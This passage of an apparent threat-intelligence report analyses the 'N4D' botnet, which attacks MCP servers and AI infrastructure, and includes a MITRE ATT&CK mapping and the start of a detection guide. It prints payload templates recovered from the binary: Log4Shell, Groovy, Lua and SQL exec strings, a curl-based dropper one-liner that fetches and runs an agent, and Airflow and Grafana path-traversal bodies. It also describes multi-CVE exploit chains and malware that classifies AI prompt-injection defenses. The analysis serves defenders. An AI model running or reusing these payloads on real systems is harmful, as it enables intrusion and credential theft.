+<h3>Exploit Payload Templates — Full Extraction</h3>
+
+<p>
+  The binary contains 7 distinct payload language families, each adapted to the target
+  execution environment. All ultimately execute the same downloader one-liner.
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Language</th><th>Context</th><th>Payload Pattern</th></tr></thead>
+  <tbody>
+    <tr>
+      <td>Log4Shell</td>
+      <td>Any Java app, Elasticsearch, Spring</td>
+      <td class="mono">${jndi:ldap://%s/a}</td>
+    </tr>
+    <tr>
+      <td>Groovy (Jenkins)</td>
+      <td>Jenkins Script Console, Elasticsearch</td>
+      <td class="mono">new ProcessBuilder(new String[]{"sh","-c",params.cmd}).start()</td>
+    </tr>
+    <tr>
+      <td>Groovy (Runtime)</td>
+      <td>ES Groovy scripting, Jenkins pipeline</td>
+      <td class="mono">Runtime.getRuntime().exec(new String[]{"sh","-c",params.cmd})</td>
+    </tr>
+    <tr>
+      <td>Java Reflection</td>
+      <td>WebLogic, Spring Boot actuator</td>
+      <td class="mono">Class.forName('java.lang.Runtime').getMethod('exec',...).invoke(..., new String[]{"sh","-c",cmd})</td>
+    </tr>
+    <tr>
+      <td>Python SSTI</td>
+      <td>Jupyter Gateway, Superset, FastGPT</td>
+      <td class="mono">${__import__('os').system('curl -s -m 30 %s -o /tmp/.n4d &amp;&amp; ...')}</td>
+    </tr>
+    <tr>
+      <td>Lua</td>
+      <td>Redis EVAL, Nginx Lua modules</td>
+      <td class="mono">os.execute('chmod +x /tmp/.n4d_redis.sh &amp;&amp; /tmp/.n4d_redis.sh &amp;') return 1 end return 0</td>
+    </tr>
+    <tr>
+      <td>JavaScript</td>
+      <td>MongoDB eval REST API</td>
+      <td class="mono">function(){ try { os.system('%s'); } catch(e) {} return 1; }</td>
+    </tr>
+    <tr>
+      <td>Groovy DSL</td>
+      <td>Jenkins Groovy script, Spring Actuator</td>
+      <td class="mono">def proc = ["sh", "-c", "curl ... /tmp/.n4d ..."].execute()</td>
+    </tr>
+    <tr>
+      <td>SQL (MySQL UDF)</td>
+      <td>MySQL with sys_exec UDF loaded</td>
+      <td class="mono">CREATE EVENT ... DO SELECT sys_exec('sh /tmp/.n4d_mysql.sh')</td>
+    </tr>
+    <tr>
+      <td>Shell multi-method</td>
+      <td>All — 6-fallback downloader chain</td>
+      <td class="mono">curl → wget → busybox wget → python3 → python2 → perl (chunked 256KB)</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  The downloader one-liner is consistent across all payload families:
+</p>
+<pre><code>curl -s -m 30 %s/api/agent/binary?arch=$B -o /tmp/.n4d \
+  &amp;&amp; chmod +x /tmp/.n4d \
+  &amp;&amp; setsid /tmp/.n4d &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;</code></pre>
+
+<p>
+  The <code>$B</code> variable resolves to <code>amd64</code>, <code>arm64</code>,
+  <code>arm</code>, or <code>386</code> based on <code>uname -m</code>. The agent also
+  beacons arch and hostname to <code>/api/beacon?arch=$B&amp;h=$(hostname)</code> before
+  attempting the download, giving operators real-time visibility into which targets executed
+  the dropper.
+</p>
+
+<h2 id="novel">13. N4D: Four Integrated Capabilities</h2>
+
+<p>
+  N4D distinguishes itself through a combination of four capabilities integrated into a single botnet. This is not a botnet defined by a single new
+  exploit, but rather the strategic integration of multiple attack components:
+</p>
+
+<p>
+  <strong>1. Generic MCP Exploitation Framework:</strong> N4D implements a C2-controlled MCP exploitation framework that exploits
+  any unauthenticated MCP server implementation without prior knowledge of the specific server type. The agent auto-discovers
+  tool catalogs via JSON-RPC handshake (<code>initialize</code> + <code>tools/list</code>), classifies tools by dangerousness, and
+  automatically invokes dangerous capabilities (<code>execute_command</code>, <code>read_file</code>, <code>query_database</code>,
+  <code>call_kubectl</code>, <code>call_az</code>, <code>call_helm</code>). This represents a generic approach to tool exploitation at scale without server-specific configuration—targeting the protocol itself rather than individual CVEs.
+</p>
+
+<p>
+  <strong>2. AI Infrastructure Targeting with CVE-Specific Chains:</strong> Once inside a compromised host, the agent deploys
+  30+ specialized modules including 3 dedicated AI platform exploits (see Section 13 for details). The binary postdates all AI CVEs by 100+ days, confirming systematic exploitation of already-patched vulnerabilities. The binary also encodes explicit result classification for prompt injection defenses, indicating active engagement with defensive AI systems.
+</p>
+
+<p>
+  <strong>3. Automated Multi-Step Exploit Chaining Engine (Escalation):</strong> The presence of <code>pathing_engine.py</code> marks a
+  significant capability escalation from opportunistic scanning to strategic lateral movement planning. The engine generates multi-step
+  exploitation chains: scan → find exposed tool → execute command → harvest credentials → deploy agent → scan adjacent networks.
+  This is implemented via a 21-template exploit registry with metadata for reliability, severity, capability requirements, and capability
+  provision. Each compromised host becomes a planned stepping stone in a broader network traversal, not an incidental victim.
+</p>
+
+<p>
+  <strong>4. Defense-Aware Malware with Prompt Injection Categorization:</strong> N4D encodes awareness of prompt injection as a <em>security category</em> (rather than as an attack technique). The binary classifies
+  results with a dedicated <code>prompt_injection_defense_detected</code> result type. This indicates the threat actor is actively engaging
+  deployed AI systems and has encountered prompt injection defenses sufficiently often to warrant automated categorization.
+</p>
+
+<p style="margin-top:1.5em; padding:1em; background:var(--bg3); border-left:3px solid var(--green);">
+  <strong>What This Means:</strong> These four capabilities exist separately in known malware: MCP protocol access exists, AI platforms have known CVEs, lateral
+  movement planning is established technique, and malware detection evasion is common. What N4D demonstrates is the
+  <strong>integrated deployment</strong> of these capabilities in a single C2-controlled botnet with tactical agent autonomy: generic protocol exploitation + AI infrastructure targeting
+  + automated chaining + active defense awareness. This combination defines a new operational model in botnet design.
+</p>
+
+<p>
+  The following analysis is derived from string extraction and symbol table forensics on the
+  <code>n4d_debug</code> binary combined with source-level review of the Python toolkit.
+</p>
+
+<div class="callout-red">
+  <p>
+    <strong>Critical Findings:</strong> LightLLM exploitation is confirmed by CVE-2026-26220 (CVSS 9.3, Feb 2026).
+    Ray Dashboard and FastGPT exploits leverage unauthenticated API access patterns and privilege escalation chains.
+    <strong>The generic MCP client framework exploits the MCP protocol directly through C2 command and control.
+    This is not addressed by CVE advisories targeting individual MCP servers.</strong> N4D's capability to enumerate any MCP server's tool catalog
+    and automatically invoke dangerous tools via C2 direction operates at the protocol level—a different attack surface than specific server vulnerabilities.
+    The prompt injection defense detection capability and credential harvesting via MCP responses indicate active engagement
+    with deployed AI systems. <strong>Immediate patching is critical.</strong> Administrators should apply all available
+    security patches and disable MCP servers where not explicitly required.
+  </p>
+</div>
+
+<figure style="margin:2rem 0; text-align:center;">
+  <img src="img_cve_timeline.svg" alt="Timeline showing LightLLM issue #784 (Mar 2025), vLLM CVE-2025-32444 (Apr 2025), CVE-2026-26220 (Feb 15 2026), CVE-2026-27944 (Mar 5 2026), CVE-2026-33032 MCPwn (Mar 15 2026), CVE-2026-39987 (Apr 8 2026), NSA/CISA MCP advisory (Jun 2 2026), and N4D binary compilation (Jun 26 2026)" style="max-width:100%; border-radius:8px; border:1px solid #30363d;"/>
+  <figcaption style="font-size:0.82em; color:#8b949e; margin-top:0.5rem;">
+    <strong>Figure 13b-1.</strong> CVE disclosure timeline vs. N4D binary compilation date. All CVEs confirmed via NVD, VulnCheck, GitHub advisories, and CISA KEV. Binary date from ELF build metadata. The N4D binary postdates all four CVE patches by 23 to 113 days, indicating continued exploitation of already-patched vulnerabilities against unpatched deployments.
+  </figcaption>
+</figure>
+
+<h3>1 — MCP Protocol Exploitation Framework + 3 AI Platforms</h3>
+
+<p>
+  <strong>Confidence: HIGH — C2-controlled botnet exploitation of generic MCP protocol is novel; server-specific CVEs exist
+  but do not cover N4D's generic approach.</strong>
+</p>
+
+<p>
+  The agent implements a complete, purpose-built MCP (Model Context Protocol) client from
+  scratch. MCP is an Anthropic-developed JSON-RPC protocol for connecting AI assistants
+  to external tools, published in November 2024. NSA and CISA published an MCP security
+  advisory on June 2, 2026, and more than 30 CVEs were filed for specific MCP server
+  implementations between January and February 2026 (including CVE-2025-49596, CVSS 9.4,
+  and CVE-2025-6514, CVSS 9.6). None of those advisories address N4D's approach: a
+  C2-controlled botnet client that probes <em>any</em> MCP-compliant server via operator-tasked reconnaissance, enumerates its
+  tool catalog, and exploits whichever dangerous tools it finds — without prior knowledge
+  of the specific server implementation. This generic exploitation framework has no
+  equivalent in published exploit tooling.
+</p>
+
+<p>The attack chain reconstructed from binary strings:</p>
+
+<ol>
+  <li><strong>Discovery:</strong> <code>probeMCP</code> identifies MCP servers via HTTP/WebSocket
+  handshake. The agent sends <code>initialize</code> + <code>tools/list</code> JSON-RPC calls
+  and parses the returned tool catalog.</li>
+
+  <li><strong>Classification:</strong> <code>parseMCP</code> scores tools by dangerousness.
+  Confirmed targeted tool names extracted from binary: <code>execute_command</code>,
+  <code>read_file</code>, <code>file_write</code>, <code>query_database</code>.
+  Cloud-specific tools detected: <code>call_kubectl</code>, <code>call_az</code>,
+  <code>call_helm</code>, <code>call_cilium</code>, <code>call_hubble</code>.</li>
+
+  <li><strong>Exploitation:</strong> <code>mcpCallWithInit</code> establishes a session
+  (<code>mcpInitSession</code>) then invokes dangerous tools directly.
+  Result types confirm two primary paths:
+  <ul>
+    <li><code>mcp_execute_shell</code> — shell command execution via MCP tools</li>
+    <li><code>mcp_execute_query</code> — SQL execution via MCP database tools</li>
+  </ul>
+  </li>
+
+  <li><strong>Credential harvest:</strong> <code>mcpCredHarvest</code> iterates all server
+  responses looking for secrets. Log strings confirm per-tool tracking:
+  <code>%s mcpCredHarvest %s:%d%s tool=%s text_empty=%d</code> and
+  <code>%s mcpCredHarvest %s:%d%s tool=%s skip: nil=%v hasError=%v</code>.</li>
+</ol>
+
+<p>
+  The <code>exploitAKSMCP</code> module extends this framework to Azure Kubernetes Service
+  environments where AKS clusters expose MCP servers as AI tooling frontends. The binary
+  contains the diagnostic string <code>AKS MCP branch for %s:%d</code> confirming a
+  dedicated branch in the exploit logic for this target type. Failure is tracked separately
+  as <code>aks_mcp_fail</code>.
+</p>
+
+<h4>Prompt Injection Defense Detection — Defensive Awareness in AI-Targeted Malware</h4>
+
+<p>
+  <strong>Novel capability:</strong> At binary offset <code>0x3fe96e</code>, the malware encodes the literal string
+  <code>prompt injection detection</code> packed consecutively with standard result-type tags
+  (<code>nginx_ui_pty</code>, <code>weblogic_rce</code>, <code>lightllm_rce</code>). This tag indicates the agent
+  detects and classifies when AI systems have <em>active prompt injection defenses</em>, treating such systems
+  as targets that require escalation (SSH key deployment) once a foothold is established.
+</p>
+
+<p>
+  N4D encodes awareness of prompt injection as a <em>security category</em>
+  rather than as an attack technique. The implication: the threat actor is actively engaging deployed AI systems
+  and has encountered prompt injection defenses sufficiently often to warrant dedicated result classification.
+  This defensive-awareness capability demonstrates iterative learning from real-world target environments.
+</p>
+
+<h3>2 — Ray Dashboard Remote Code Execution (CVE-2023-48022)</h3>
+
+<p>
+  <strong>Confidence: HIGH — CVE-2023-48022 confirmed, CVSS 9.8; unauthenticated port 8265 RCE via /run API endpoint.</strong>
+</p>
+
+<p>
+  <a href="https://github.com/ray-project/ray" target="_blank">Ray Dashboard</a> is a web UI for managing distributed ML compute clusters.
+  CVE-2023-48022 describes an unauthenticated remote code execution vulnerability in Ray's job submission API. The agent targets the
+  unauthenticated REST API endpoint <code>/run</code> which accepts job submissions with arbitrary <code>bash -c</code> commands as the entrypoint.
+  The binary contains the URL template <code>https://%s:%d/run/%s/%s/%s</code> (host:port substitution) paired with the deploy function
+  <code>deployRayDashboard</code>. Port 8265 is the default Ray Dashboard web UI port. The function succeeds when the API accepts the job
+  submission and returns a success result type <code>ray_rce</code>. No authentication is required; exposed Ray Dashboard instances are
+  vulnerable to immediate RCE.
+</p>
+
+<p>
+  This attack vector exemplifies the campaign's targeting of unprotected ML infrastructure. Ray Dashboard clusters are often deployed
+  in development or staging environments without network isolation, making them accessible from compromised jump hosts or lateral-movement
+  scenarios post-MCP exploitation.
+</p>
+
+<h3>3 — LightLLM Pickle Deserialization (CVE-2026-26220)</h3>
+
+<p>
+  <strong>Confidence: HIGH — CVE-2026-26220 confirmed, CVSS 9.3; actor likely had
+  pre-disclosure knowledge.</strong>
+</p>
+
+<p>
+  The binary contains the result type string <code>lightllm_pickle</code> packed adjacent to
+  the <code>lightllm_rce</code> success tag and the <code>Apache Superset</code> label. This
+  naming pattern mirrors the Superset exploitation chain (<code>buildSupersetPickle</code>),
+  which is a confirmed Python pickle deserialization RCE via forged session cookies (CVE-2023-27524).
+</p>
+
+<p>
+  <a href="https://github.com/ModelTC/LightLLM" target="_blank">LightLLM</a> is an
+  open-source LLM inference and serving framework. CVE-2026-26220 (CVSS 9.3), publicly
+  disclosed February 15, 2026 by Chocapikk and assigned by VulnCheck, describes an
+  unauthenticated remote code execution vulnerability in LightLLM's PD (prefill-decode)
+  disaggregation mode: the PD master node exposes two WebSocket endpoints —
+  <code>/pd_register</code> and <code>/kv_move_status</code> — that receive binary frames
+  and pass the data directly to <code>pickle.loads()</code> without authentication or
+  validation. The agent's use of <code>makeWSBinaryFrame</code> / <code>makeWSFrameType</code>
+  WebSocket primitives is consistent with this attack surface.
+</p>
+
+<p>
+  The vulnerability class was first reported publicly in LightLLM GitHub issue #784
+  (March 2025) as a ZMQ <code>recv_pyobj()</code> deserialization problem in multi-node mode;
+  maintainers acknowledged it but did not patch it for eleven months. A comparable issue in
+  vLLM received CVE-2025-32444 (CVSS 10.0) in April 2025. The N4D binary was compiled
+  June 26, 2026 — four months after the February 15, 2026 public disclosure — but the
+  actor's pre-disclosure awareness is plausible given the eleven-month window during which
+  issue #784 was publicly open and unpatched. No official patch was released for LightLLM
+  as of the CVE disclosure date.
+</p>
+
+<h3>4 — Marimo Notebook WebSocket Kernel Exploit (CVE-2026-39987)</h3>
+
+<p>
+  <strong>Confidence: HIGH — CVE-2026-39987 confirmed, CVSS 9.3, CISA KEV; N4D was among
+  the earliest exploiters.</strong>
+</p>
+
+<p>
+  <a href="https://github.com/marimo-team/marimo" target="_blank">Marimo</a> is a reactive
+  Python notebook introduced in 2023. CVE-2026-39987 (CVSS 9.3), disclosed April 8, 2026,
+  describes a pre-authentication remote code execution vulnerability caused by a missing
+  authentication check on the <code>/terminal/ws</code> WebSocket endpoint — an unauthenticated
+  attacker gains a full PTY shell with no credentials required. The vulnerability was patched
+  in Marimo v0.23.0 and added to the CISA Known Exploited Vulnerabilities (KEV) catalog on
+  April 23, 2026.
+  The binary encodes:
+</p>
+<ul>
+  <li><code>marimo_ws</code> — dedicated WebSocket interaction identifier for Marimo's kernel protocol</li>
+  <li><code>marimo_rce</code> — success result type for remote code execution</li>
+  <li><code>probeMarimo</code> + <code>deployMarimo</code> — probe and exploit functions</li>
+</ul>
+
+<p>
+  Exploitation was observed in the wild within nine hours and forty-one minutes of the
+  advisory's publication. Between April 11 and April 14, 2026, Sysdig tracked 662 exploit
+  events from 11 unique IP addresses across 10 countries. A separate attacker group weaponized
+  CVE-2026-39987 to deploy NKAbuse — a Go-based blockchain C2 backdoor — via a typosquatting
+  HuggingFace Space. N4D's use of the same WebSocket vector (<code>marimo_ws</code>) is
+  consistent with this pre-auth RCE surface, but deploys the N4D agent rather than NKAbuse.
+  The N4D binary compiled June 26, 2026 represents continued mass exploitation two and a half
+  months after the patch was available.
+</p>
+
+<h3>5 — Nginx UI Backup Decryption Chain (CVE-2026-27944 + CVE-2026-33032 "MCPwn")</h3>
+
+<p>
+  <strong>Confidence: HIGH — two CVEs confirmed (both CVSS 9.8); N4D chains them into a
+  single automated kill chain.</strong>
+</p>
+
+<p>
+  <a href="https://github.com/0xJacky/nginx-ui" target="_blank">Nginx UI</a> is a web-based
+  Nginx management interface. The function chain implemented in <code>n4d_debug</code>
+  exploits two distinct, separately-patched vulnerabilities in sequence:
+</p>
+
+<p><strong>Stage 1 — CVE-2026-27944 (CVSS 9.8, patched v2.3.3, March 5, 2026):</strong>
+  Unauthenticated backup download and AES-256-CBC key disclosure. The backup endpoint returns
+  the decryption key in the <code>X-Backup-Security</code> response header alongside the
+  encrypted archive. Decrypting the archive yields <code>app.ini</code>, which contains
+  <code>node_secret</code> — the shared secret used to authenticate Nginx UI's MCP interface.
+</p>
+
+<p><strong>Stage 2 — CVE-2026-33032 "MCPwn" (CVSS 9.8, patched v2.3.4, March 15, 2026):</strong>
+  Nginx UI's MCP integration exposes two endpoints: <code>/mcp</code> and <code>/mcp_message</code>.
+  While <code>/mcp</code> enforces <code>AuthRequired()</code> middleware, <code>/mcp_message</code>
+  received only an IP allowlist check — and the default allowlist ships empty, treating it as
+  "allow all." An attacker who has obtained <code>node_secret</code> from Stage 1 can pass it
+  as a query parameter to obtain a session ID, then issue arbitrary commands through
+  <code>/mcp_message</code> without further authentication. This vulnerability was named
+  "MCPwn" by Pluto Security and was listed among Recorded Future's 31 most actively exploited
+  vulnerabilities of March 2026, with approximately 2,689 exposed instances identified on
+  Shodan at the time of disclosure.
+</p>
+
+<p>The complete function sequence recovered from the N4D binary maps directly to this chain:</p>
+
+<ol>
+  <li><code>probeNginxUI</code> — detect exposed instance and check for backup endpoint availability</li>
+  <li><code>decryptBackupAndExtractSecret</code> — download backup archive; key from
+  <code>X-Backup-Security</code> header (CVE-2026-27944 Stage 1)</li>
+  <li><code>tryDecryptZipEntries</code> / <code>tryPlainZipEntries</code> — AES-CBC decryption
+  of backup zip entries</li>
+  <li><code>aesCBCDecrypt</code> — custom AES-CBC implementation for the decryption step</li>
+  <li><code>extractNodeSecretFromIni</code> — parse decrypted <code>app.ini</code> and extract
+  <code>node_secret</code> and API tokens (CVE-2026-27944 Stage 2)</li>
+  <li><code>deployNginxUI</code> — authenticate to <code>/mcp_message</code> via
+  <code>node_secret</code> and execute commands; result type <code>nginx_ui_pty</code>
+  (CVE-2026-33032)</li>
+</ol>
+
+<p>
+  The <code>nginx_ui_no_secret</code> fallback result type confirms the agent handles
+  cases where <code>node_secret</code> is absent in the backup and routes to an alternate
+  exploitation path. The automated chaining of CVE-2026-27944 into CVE-2026-33032 — without
+  requiring any interactive step — is specific to N4D and not described in any published
+  advisory or proof-of-concept.
+</p>
+
+<h3>6 — Additional Novel Result Types Recovered</h3>
+
+<p>
+  The following additional result type strings were extracted from <code>.rodata</code>
+  that confirm exploitation capabilities beyond those documented in sections above:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Result Type Tag</th><th>Technique</th></tr></thead>
+  <tbody>
+    <tr><td class="mono">jenkins_cli_read_then_groovy</td><td>Two-stage Jenkins chain: read arbitrary file via Jenkins CLI, then execute Groovy payload via Script Console — no single published CVE covers this specific chain</td></tr>
+    <tr><td class="mono">pg_copy_to_program</td><td>PostgreSQL <code>COPY TO PROGRAM</code> RCE — superuser privilege required; the agent's <code>pgIsSuperuser</code> check gates this path</td></tr>
+    <tr><td class="mono">mysql_outfile_cron</td><td>MySQL <code>SELECT INTO OUTFILE '/etc/cron.d/...'</code> — writes cron entry directly, requires <code>FILE</code> privilege and specific <code>secure_file_priv</code> configuration</td></tr>
+    <tr><td class="mono">docker_sock_escape</td><td><code>main.tryDockerSockEscape</code> — mounts host filesystem via <code>/var/run/docker.sock</code> and writes to <code>/etc/cron.d/</code> for root persistence</td></tr>
+    <tr><td class="mono">internal_port_scan</td><td>Autonomous internal subnet scan triggered post-compromise, independent of C2 task assignment</td></tr>
+    <tr><td class="mono">mcp_execute_query / mcp_execute_shell</td><td>MCP tool-call based SQL and shell execution (see Section 3 above)</td></tr>
+    <tr><td class="mono">airflow_unauth_api</td><td>Airflow v1/v2 unauthenticated DAG trigger; DAG masquerades as <code>sys_health_check</code> in the result beacon</td></tr>
+    <tr><td class="mono">aks_mcp_fail</td><td>AKS + MCP combined attack failure sentinel — confirms the attack was attempted but the MCP branch did not achieve execution</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  Two payload strings recovered from the binary illustrate how deeply the actor has
+  integrated masquerade names into every stage of the kill chain:
+</p>
+<pre><code>{"dag_id":"sys_health_check","is_paused":false,"file_token":"import_dag"}
+{"url":"http://localhost/","filePath":"../../etc/chromium.d/sys_alias"}</code></pre>
+<p>
+  The first is the Airflow DAG injection body — the malicious DAG is named
+  <code>sys_health_check</code>, masquerading as a legitimate health monitoring workflow.
+  The second is the Grafana Renderer path traversal payload — writing to
+  <code>chromium.d/sys_alias</code> echoes the <code>sys_alias.sh</code> persistence
+  filename used throughout the campaign.
+</p>
+
+<!-- Section 15: MITRE -->
+<h2 id="mitre">14. MITRE ATT&amp;CK Mapping</h2>
+
+<div class="fig-wrap">
+  <img src="img_mitre.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="MITRE ATT&CK coverage matrix">
+  <p class="fig-cap">Fig. 10 - MITRE ATT&amp;CK coverage: 9 tactics, 24 techniques mapped from the N4D campaign artifacts.</p>
+</div>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Tactic</th><th>ID</th><th>Technique</th><th>Evidence</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><span class="pill p-dim">TA0043</span> Recon</td>
+      <td class="mono">T1595</td>
+      <td class="strong">Active Scanning</td>
+      <td>mcp_scan.py - mcp_v3.py; 500 concurrent probes; 14 target ports; 4 URL paths per host</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-dim">TA0043</span> Recon</td>
+      <td class="mono">T1046</td>
+      <td class="strong">Network Service Discovery</td>
+      <td>Systematic /24 and /16 sweeps; 851,942+ probes per /16 block documented in scan logs</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">TA0001</span> Initial Access</td>
+      <td class="mono">T1190</td>
+      <td class="strong">Exploit Public-Facing Application</td>
+      <td>Unauthenticated MCP tools/call targeting execute_command; no CVE, design misuse</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">TA0002</span> Execution</td>
+      <td class="mono">T1059.006</td>
+      <td class="strong">Command and Scripting Interpreter: Python</td>
+      <td>mesh_agent.py / polymorphic Python loader exec'd on victim after delivery</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">TA0002</span> Execution</td>
+      <td class="mono">T1203</td>
+      <td class="strong">Exploitation for Client Execution</td>
+      <td>tools/call on exposed MCP server RCE tools delivers arbitrary OS commands</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0003</span> Persistence</td>
+      <td class="mono">T1098.004</td>
+      <td class="strong">Account Manipulation: SSH Authorized Keys</td>
+      <td>Backdoor RSA public key (comment: "test") inserted into /root/.ssh/authorized_keys on multiple nodes</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0003</span> Persistence</td>
+      <td class="mono">T1543.003</td>
+      <td class="strong">Create or Modify System Process: Systemd Service</td>
+      <td>beacon.sh delivers agent as a systemd service for persistence across reboots</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0005</span> Defense Evasion</td>
+      <td class="mono">T1027</td>
+      <td class="strong">Obfuscated Files or Information</td>
+      <td>XOR-encoded string literals in polymorphic loader; 22 sensitive patterns obfuscated</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0005</span> Defense Evasion</td>
+      <td class="mono">T1027.002</td>
+      <td class="strong">Software Packing</td>
+      <td>zlib/bz2 max-compression blob packed into loader stub; random algorithm per build</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0005</span> Defense Evasion</td>
+      <td class="mono">T1070.004</td>
+      <td class="strong">Indicator Removal: File Deletion</td>
+      <td>os.unlink(sys.argv[0]) self-deletion on first run of the polymorphic loader stub</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0005</span> Defense Evasion</td>
+      <td class="mono">T1036.005</td>
+      <td class="strong">Match Legitimate Name or Location</td>
+      <td>Process masquerades as kworker (kernel worker thread name); written to /dev/shm/ to avoid disk writes</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0005</span> Defense Evasion</td>
+      <td class="mono">T1205</td>
+      <td class="strong">Traffic Signaling</td>
+      <td>Cloudflare tunnel relay hides actual C2 IP; CDN 302 redirect disguises server identity</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0006</span> Cred Access</td>
+      <td class="mono">T1552.005</td>
+      <td class="strong">Cloud Instance Metadata API</td>
+      <td>Azure IMDS token exfiltration via 169.254.169.254; three auto-refresh cycles observed in intel</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0006</span> Cred Access</td>
+      <td class="mono">T1003.008</td>
+      <td class="strong">OS Credential Dumping: /etc/shadow</td>
+      <td>Shadow file exfiltrated verbatim via POST /api/intel from multiple nodes</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0006</span> Cred Access</td>
+      <td class="mono">T1528</td>
+      <td class="strong">Steal Application Access Token</td>
+      <td>AWS IAM keys, STS session tokens, Azure ARM JWTs harvested via MCP tool calls</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-dim">TA0007</span> Discovery</td>
+      <td class="mono">T1082</td>
+      <td class="strong">System Information Discovery</td>
+      <td>Agent reports hostname, CPU architecture, load average, and capability flags on register</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-dim">TA0007</span> Discovery</td>
+      <td class="mono">T1613</td>
+      <td class="strong">Container and Resource Discovery</td>
+      <td>Docker socket detection; docker boolean reported in intel schema; Docker port :2375 in v4.0 scan list</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0008</span> Lateral Movement</td>
+      <td class="mono">T1021.004</td>
+      <td class="strong">Remote Services: SSH</td>
+      <td>SSH persistence via authorized_keys backdoor entry (comment: "test") found on multiple nodes</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0008</span> Lateral Movement</td>
+      <td class="mono">T1210</td>
+      <td class="strong">Exploitation of Remote Services</td>
+      <td>Chain engine executes sequential exploit steps across adjacent network targets</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">TA0011</span> C&amp;C</td>
+      <td class="mono">T1571</td>
+      <td class="strong">Non-Standard Port</td>
+      <td>Controller on :8443; P2P mesh on :9999; both non-standard for their protocols</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">TA0011</span> C&amp;C</td>
+      <td class="mono">T1573</td>
+      <td class="strong">Encrypted Channel</td>
+      <td>HMAC-authenticated API in v4.0; Cloudflare HTTPS tunnel for agent traffic</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">TA0011</span> C&amp;C</td>
+      <td class="mono">T1090.003</td>
+      <td class="strong">Proxy: Multi-hop Proxy</td>
+      <td>Cloudflare tunnel registered per node via POST /api/endpoint; C2 IP hidden from defenders</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">TA0010</span> Exfiltration</td>
+      <td class="mono">T1041</td>
+      <td class="strong">Exfiltration Over C2 Channel</td>
+      <td>POST /api/intel sends credentials over the same authenticated C2 channel as task polling</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-red">TA0040</span> Impact</td>
+      <td class="mono">T1496</td>
+      <td class="strong">Resource Hijacking</td>
+      <td>Compromised hosts enrolled into scanner fleet and assigned new CIDR ranges to scan</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-orange">TA0003</span> Persistence</td>
+      <td class="mono">T1546.004</td>
+      <td class="strong">Event Triggered Execution: Unix Shell Configuration Modification</td>
+      <td><code>/etc/profile.d/sys_alias.sh</code> written by Nginx UI and Grafana Renderer exploit chains; executes on every interactive login for any user on the system — survives agent restarts</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-yellow">TA0004</span> Privilege Escalation</td>
+      <td class="mono">T1611</td>
+      <td class="strong">Escape to Host</td>
+      <td><code>deployDockerSocket</code> mounts the host filesystem and writes a root cron entry from within a container — escaping container isolation entirely; confirmed exploit module in binary</td>
+    </tr>
+    <tr>
+      <td><span class="pill p-blue">TA0011</span> C&amp;C</td>
+      <td class="mono">T1090.002</td>
+      <td class="strong">Proxy: External Proxy</td>
+      <td><code>main.startMeshTunnel</code> establishes Cloudflare Quick Tunnels (<code>*.trycloudflare.com</code>) — outbound anonymous relay, no infrastructure registration, TLS termination at Cloudflare edge; C2 traffic blends with legitimate Cloudflare HTTPS</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+
+<!-- Section 16: Detection -->
+<h2 id="detection">15. Detection &amp; Defensive Guidance</h2>
+
+<h3>For MCP Server Operators</h3>
+
+<ul>
+  <li>Never expose MCP servers on public IPs without authentication. Bind to <code>127.0.0.1</code> or place behind an authenticated reverse proxy.</li>
+  <li>If cloud-deployed: restrict to VPC private networks and use TLS mutual auth or an API gateway with token validation.</li>
+  <li>Audit tool names in your server configuration. Any tool providing shell execution, file system access, or database query capability is effectively unauthenticated RCE if the server is reachable without auth.</li>
+  <li>Check MCP server logs for <code>initialize</code> + <code>tools/list</code> sequences from <code>"clientInfo": {"name": "n4d-vps"}</code> - that string is the campaign's reliable network IOC.</li>
+  <li>If your server has ever been publicly accessible: rotate all credentials present in environment variables, <code>~/.aws/credentials</code>, <code>/root/.ssh/</code>, and any cloud metadata token scope. Explicitly rotate <code>OPENAI_API_KEY</code> and <code>ANTHROPIC_API_KEY</code> - these are first-class harvest targets in the pathing engine.</li>
+</ul>
+
+<h3>For Compromised Host Responders</h3>
+
+<ul>
+  <li>Check <code>/etc/cron.d/.sys-health</code> and <code>/etc/cron.d/.syscheck</code> — the agent installs both. Remove both before killing the agent process, or it relaunches within 120 seconds.</li>
+  <li>Audit <code>/root/.bashrc</code> for appended command lines - the dropper adds a persistence entry that fires on every root login.</li>
+  <li>Check <code>/etc/profile.d/sys_alias.sh</code> — written by the Nginx UI and Grafana exploit chains as a login-triggered payload. Present even when cron is cleaned.</li>
